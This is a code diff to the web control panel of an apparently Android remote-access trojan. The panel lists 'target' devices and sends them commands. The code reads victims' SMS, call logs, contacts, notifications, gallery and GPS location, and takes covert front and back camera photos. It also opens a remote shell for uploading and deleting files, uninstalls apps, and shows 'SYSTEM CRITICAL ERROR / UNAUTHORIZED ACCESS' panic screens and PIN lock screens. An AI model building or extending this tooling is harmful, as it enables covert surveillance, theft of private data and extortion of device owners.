@@ -29,11 +29,13 @@
         input, textarea { background:#1e2e2e; border:1px solid #3b5e5e; padding:12px 15px; border-radius:15px; color:#fff; width:100%; }
         button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
         .red-btn { background:var(--secondary); color:#fff; }
-        .terminal { background:#050505; color:#00ff00; font-family:'Courier New', monospace; padding:15px; border-radius:10px; min-height:300px; overflow-y:auto; border:1px solid #333; }
-        .term-line { margin-bottom:5px; white-space:pre-wrap; }
-        .term-input-row { display:flex; align-items:center; gap:10px; margin-top:10px; }
+        .terminal { background:#050505; color:#00ff00; font-family:'Courier New', monospace; padding:15px; border-radius:10px; height:350px; overflow-y:auto; border:1px solid #333; margin-bottom:10px; }
+        .term-line { margin-bottom:2px; white-space:pre-wrap; }
+        .term-input-row { display:flex; align-items:center; gap:10px; background:#000; padding:10px; border-radius:10px; }
         .term-prompt { color:var(--secondary); font-weight:bold; }
-        .term-input { background:transparent; border:none; color:#fff; padding:0; outline:none; font-family:monospace; }
+        .term-input { background:transparent; border:none; color:#fff; padding:0; outline:none; font-family:monospace; width:100%; }
+        .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
+        .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
         @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
     </style>
 </head>
@@ -68,7 +70,7 @@
     </div>
 
     <script>
-        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termHistory = "";
+        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", mediaRecorder, audioChunks = [];
 
         async function cmd(c, b={}) {
             if(!selId) return;
@@ -84,23 +86,32 @@
             b.innerHTML = ""; f.innerHTML = "";
 
             if(t === 'filemanager') {
-                termHistory = "Connecting to remote shell...\nType 'ls' to list files, 'cd <dir>' to move, 'del <file>' to delete.\n";
-                b.innerHTML = `<div class="terminal" id="term-out">${termHistory}</div>
+                termOut = "ghost@android:~# Connected.\nType 'ls', 'cd', 'del', or 'help'\n\n";
+                b.innerHTML = `<div class="terminal" id="terminal"></div>
                                <div class="term-input-row">
                                  <span class="term-prompt">ghost@android:~#</span>
                                  <input id="term-in" class="term-input" autofocus onkeydown="if(event.key==='Enter') execShell()">
                                </div>`;
                 f.innerHTML = `<button onclick="document.getElementById('up-file').click()">+ UPLOAD FILE</button>
                                <input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
+                document.getElementById('terminal').innerText = termOut;
                 cmd('filemanager');
                 return;
             } else if(t === 'panic') {
                 b.innerHTML = `<p>Duration (Sec):</p><input type="number" id="psec" value="30"><p style="margin-top:10px;">Hell Message:</p><textarea id="pmsg">SYSTEM CRITICAL ERROR\nUNAUTHORIZED ACCESS</textarea>`;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">ACTIVATE HELL</button>`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">ACTIVATE HELL</button><button onclick="cmd('stop_panic')">STOP</button>`;
+                return;
+            } else if(t === 'voice') {
+                b.innerHTML = `<div style="text-align:center; padding:20px;"><i id="v-icon" class="fas fa-microphone" style="font-size:3rem; color:var(--dim)"></i><p id="v-stat" style="margin-top:15px;">Ready to record...</p></div>`;
+                f.innerHTML = `<button id="v-start" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none" class="red-btn">STOP & SEND</button>`;
+                return;
+            } else if(t === 'setwallpaper') {
+                b.innerHTML = `<p>Upload Image:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px;">Or Direct URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
+                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
                 return;
             }
 
-            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo' };
+            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', get_location:'get_location' };
             if(map[t]) cmd(map[t]);
             render();
         }
@@ -110,9 +121,38 @@
             const val = inp.value.trim();
             if(!val) return;
             cmd(val);
-            termHistory += `<span style="color:var(--secondary)"># ${val}</span>\n`;
-            document.getElementById('term-out').innerText = termHistory;
+            termOut += `ghost@android:~# ${val}\n`;
+            document.getElementById('terminal').innerText = termOut;
+            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
             inp.value = "";
+        }
+
+        async function startRec() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = sendAudio;
+            mediaRecorder.start();
+            document.getElementById('v-icon').style.color = 'red';
+            document.getElementById('v-stat').innerText = 'Recording...';
+            document.getElementById('v-start').style.display = 'none';
+            document.getElementById('v-stop').style.display = 'inline-block';
+        }
+        function stopRec() { mediaRecorder.stop(); }
+        async function sendAudio() {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+            const formData = new FormData(); formData.append('file', audioBlob);
+            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
+            const data = await res.json();
+            if(data.status === 'ok') cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
+        }
+
+        async function uploadWall(input) {
+            const formData = new FormData(); formData.append('file', input.files[0]);
+            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
+            const data = await res.json();
+            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
         }
 
         async function uploadShellFile(input) {
@@ -121,29 +161,36 @@
             const data = await res.json();
             if(data.status === 'ok') {
                 const url = window.location.origin + '/captured_images/' + data.filename;
-                cmd(`shell_upload ${url} ${data.filename}`);
-                termHistory += `System: Uploading ${data.filename}...\n`;
+                cmd(`upload ${btoa(data.filename)} ${btoa(url)}`); // Using upload command in client
+                termOut += `System: Uploading ${data.filename}...\n`;
+                document.getElementById('terminal').innerText = termOut;
             }
         }
 
         function closeModal() {
+            if(curMod === 'gallery') cmd('exit_gallery');
             if(curMod === 'filemanager') cmd('exit_shell');
             document.getElementById('modal').style.display = 'none'; curMod = null;
         }
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
-            const d = cache[selId], b = document.getElementById('modal-body');
+            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
             
             if(curMod === 'filemanager') {
                 const fm = d.fm;
+                const fmString = JSON.stringify(fm);
+                if(hash === fmString) return; hash = fmString;
                 let out = `Path: ${fm.path}\n\n`;
-                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name}\n`);
-                document.getElementById('term-out').innerText = out;
+                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name} (${(x.size/1024).toFixed(1)} KB)\n`);
+                termOut += out + "\n";
+                document.getElementById('terminal').innerText = termOut;
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
                 return;
             }
 
-            const curHash = JSON.stringify(d[curMod] || d.info || "");
+            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice'].includes(curMod)) return;
+            const curHash = JSON.stringify(d[curMod] || d.info || d.media || d.location || "");
             if(hash === curHash) return; hash = curHash;
             b.innerHTML = "";
 
@@ -158,19 +205,31 @@
                     <tr><td><b>WiFi</b></td><td>${i.WiFi}</td></tr>
                     <tr><td><b>SIM 1</b></td><td>${i.SIM1 || 'N/A'}</td></tr>
                     <tr><td><b>SIM 2</b></td><td>${i.SIM2 || 'N/A'}</td></tr>
-                    <tr><td><b>Phone Number</b></td><td>${i.PhoneNumber || 'Unknown'}</td></tr>
+                    <tr><td><b>Number</b></td><td>${i.PhoneNumber || 'Unknown'}</td></tr>
                 </table>`;
-            } else if(curMod === 'contacts') {
-                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'apps') {
+                b.innerHTML = `<table><tr><th>App Name</th><th>Action</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}<br><small>${a.packageName}</small></td><td><button onclick="cmd('run ${a.packageName}')">RUN</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
             } else if(curMod === 'sms') {
                 b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'calls') {
                 b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'apps') {
-                b.innerHTML = `<table><tr><th>App</th><th>PKG</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}</td><td><button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">UNINSTALL</button></td></tr>`).join('')}</table>`;
+            } else if(curMod === 'contacts') {
+                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'notifications') {
+                b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'get_location') {
+                const loc = d.location;
+                b.innerHTML = `<div style="text-align:center;">${loc.img?`<img src="${loc.img}" style="width:100%; border-radius:15px; margin-bottom:15px;">`:''}<p>${loc.url || 'Waiting...'}</p><br>${loc.url?`<a href="${loc.url}" target="_blank"><button>VIEW ON GOOGLE MAPS</button></a>`:''}</div>`;
             } else if(curMod.includes('pic')) {
                 const m = d.media;
-                b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px;"></div>`;
+                b.innerHTML = `<div style="text-align:center;"><img src="${m.is_direct?'data:image/jpeg;base64,'+m.last_img:'/captured_images/'+m.last_img}" style="width:100%; border-radius:15px; border:1px solid var(--primary);"></div>`;
+            } else if(curMod === 'gallery') {
+                const g = d.gallery;
+                b.innerHTML = `<div class="gal-grid">${g.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
+                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${g.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
+            } else if(curMod === 'toast') {
+                b.innerHTML = `<p>Msg:</p><textarea id="lmsg">LOCKED</textarea><p>PIN:</p><input id="lpin" value="1337">`;
+                f.innerHTML = `<button onclick="cmd('lock '+document.getElementById('lmsg').value+'|'+document.getElementById('lpin').value)">LOCK</button><button onclick="cmd('unlock')">UNLOCK</button>`;
             }
         }
 
@@ -183,7 +242,7 @@
                         <b style="color:var(--primary)">${d.model}</b> (${d.man})<br>
                         <small style="color:var(--dim)">Android ${d.ver} | ${d.cnt}</small><br>
                         <small style="color:var(--secondary)">ID: ${d.id} | BAT: ${d.bat}</small>
-                    </div>`).join('') || "No target online.";
+                    </div>`).join('') || "Scanning...";
                 if(selId) {
                     const dres = await fetch(`/api/data/${selId}`);
                     cache[selId] = await dres.json();
@@ -205,7 +264,8 @@
                 {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                 {id:'apps', i:'fa-th', l:'APPS'}, {id:'takebackpic', i:'fa-camera', l:'CAM BACK'},
                 {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'}, {id:'voice', i:'fa-microphone', l:'SEND VOICE'},
-                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'}
+                {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'},
+                {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'}, {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="openModal('${b.id}')"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
         }
